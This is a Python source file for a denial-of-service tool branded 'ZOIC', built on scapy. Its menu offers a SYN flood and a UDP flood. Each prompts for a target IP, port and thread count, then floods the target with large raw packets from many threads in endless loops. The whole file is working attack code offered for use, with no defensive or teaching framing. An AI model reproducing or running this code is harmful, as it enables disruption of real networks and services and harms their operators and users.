import os
import sys
import random
import threading
import time
from scapy.all import IP, TCP, UDP, Raw, send

class TextColors:
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    PURPLE = '\033[35m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'
    BOLD = "\033[01;01m"
    DARK_RED = "\033[38;5;124m"
    CRIMSON = "\033[38;5;196m"
    TOMATO = "\033[38;5;202m"
    LIGHT_RED = "\033[91m"
    LIGHT_GREEN = "\033[92m" 
    RADICAL_RED = "\033[38;5;160m"
    DARK_GREEN = "\033[38;5;28m"

def logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(TextColors.LIGHT_GREEN + """
        ██╗      █████╗ ██╗   ██╗███████╗██████╗     ██╗  ██╗
        ██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗    ██║  ██║
        ██║     ███████║ ╚████╔╝ █████╗  ██████╔╝    ███████║
        ██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗    ╚════██║
        ███████╗██║  ██║   ██║   ███████╗██║  ██║         ██║
        ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝         ╚═╝ 
          
╔════════════════════════════════════════════════════════════════════╗
║                   https://doxwebd.serveo.net                       ║
║════════════════════════════════════════════════════════════════════║
║                                                                    ║
║                      syn  |  syn flood attack                      ║
║                      udp  |  udp flood attack                      ║
║                      exit |  exit zoic                             ║
║                                                                    ║                                                                  
╚════════════════════════════════════════════════════════════════════╝
""")

def layer4():
    while True:
        logo()
        select = input(TextColors.GREEN + """═══[root@ZOIC~$]                                                                   
═══> """ + TextColors.RESET)

        if select == "syn" or select.lower() == "1":
            def send_packets(target_ip, target_port):
                while True:
                    ip = IP(dst=target_ip)
                    tcp = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S", options=[("MSS", 1460)])
                    byte = Raw(load='X' * 1400)
                    pkt = ip / tcp / byte
                    send(pkt, verbose=0)
                    print(TextColors.CYAN + f"[+] IP Address : {target_ip} [+] SYN Packet : {pkt.summary()}"+ TextColors.RESET)
                    time.sleep(0.01)

            def start_flooding(target_ip, target_port, thread_count):
                threads = []
                for _ in range(thread_count):
                    thread = threading.Thread(target=send_packets, args=(target_ip, target_port))
                    threads.append(thread)
                    thread.start()
                for thread in threads:
                    thread.join()

            target_ip = input(TextColors.WHITE + "IP > "+ TextColors.RESET)  
            target_port = int(input(TextColors.WHITE + "Port > "+ TextColors.RESET))  
            thread_count = int(input(TextColors.WHITE + "Thread > "+ TextColors.RESET))  
            start_flooding(target_ip, target_port, thread_count)


        elif select == "udp" or select.lower() == "2":
            def udp_flood(target_ip, target_port):
                while True:
                    ip = IP(dst=target_ip)
                    udp = UDP(sport=random.randint(1024, 65535), dport=target_port)
                    byte = Raw(load='X' * 1400)
                    pkt = ip / udp / byte
                    send(pkt, verbose=0)
                    print(TextColors.CYAN + f"[+] IP Address : {target_ip} [+] UDP Packet : {pkt.summary()}" + TextColors.RESET)

            def start_flooding(target_ip, target_port, thread_count):
                threads = []
                for _ in range(thread_count):
                    thread = threading.Thread(target=udp_flood, args=(target_ip, target_port))
                    threads.append(thread)
                    thread.start()
                for thread in threads:
                    thread.join()

            target_ip = input(TextColors.WHITE + "IP > "+ TextColors.RESET)  
            target_port = int(input(TextColors.WHITE + "Port > "+ TextColors.RESET))  
            thread_count = int(input(TextColors.WHITE + "Thread > "+ TextColors.RESET))  

            start_flooding(target_ip, target_port, thread_count)
            

        elif select == "exit" or select.lower() == "2":
            sys.exit()
    
             


if __name__ == "__main__":
    layer4()